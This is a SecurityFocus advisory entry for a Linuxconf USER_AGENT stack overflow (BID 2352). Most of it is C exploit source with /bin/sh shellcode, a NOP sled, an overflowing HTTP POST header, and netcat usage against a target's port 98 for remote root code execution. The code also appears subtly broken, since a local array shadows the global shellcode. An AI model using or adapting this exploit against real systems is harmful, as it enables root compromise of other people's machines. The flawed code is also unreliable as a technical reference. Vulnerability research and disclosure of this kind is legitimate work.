source: http://www.securityfocus.com/bid/2352/info

Linuxconf is a Linux configuration utility from Solucorp.

An attacker supplying excess data to the USER_AGENT field in vulnerable versions of Linuxconf. This data can overflow the relevant buffer, creating a stack overflow and, properly exploited, allowing remote execution of arbitrary code as root.

/*

  linuxconf exploit by R00T-X (c) 1999

  USER_AGENT overflow x86
  should work on all linux's but you need to have
  network access to linuxconf

  greetz to: j0e, AcidCrunCh, |420|, umm and everyone who knows me, heh :P

  have fun with this but for EDUCATIONAL PURPOSES :)

  Usage:   (./linexp <offset>;cat)| nc targethost 98

 */

char shell[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\xeb\x3b\x5e\x89\x76\x08\x31\xed\x31\xc9\x31\xc0\x88"
"\x6e\x07\x89\x6e\x0c\xb0\x0b\x89\xf3\x8d\x6e\x08\x89\xe9\x8d\x6e"
"\x0c\x89\xea\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\xe8\xc0\xff\xff\xff/bin/sh\x00";

#include <stdio.h>
#include <stdlib.h>
#include <limits.h>
#include <string.h>

#define BUFLEN 1025
#define NOP 0x90

void
main (int argc, char *argv[])
{
  char buf[BUFLEN];
  int offset,nop,i;
  unsigned long esp;
  char shell[1024+300];

  if(argc < 2)
  {
  fprintf(stderr,"usage: (%s <offset>;cat)|nc host.com 98\n", argv[0]);
  exit(0);
  }

  nop = 511;
  esp = 0xefbfd5e8;
  offset = atoi(argv[1]);

  memset(buf, NOP, BUFLEN);
  memcpy(buf+(long)nop, shell, strlen(shell));

  for (i = 256; i < BUFLEN - 3; i += 2)
{    *((int *) &buf[i]) = esp + (long) offset;
     shell[ sizeof(shell)-1 ] = 0;
}

 printf("POST / HTTP/1.0\r\nContent-Length: %d, User-agent: \r\n", BUFLEN);
  for (i = 0; i < BUFLEN; i++)
    putchar(buf[i]);

  printf("\r\n");

  return;
}

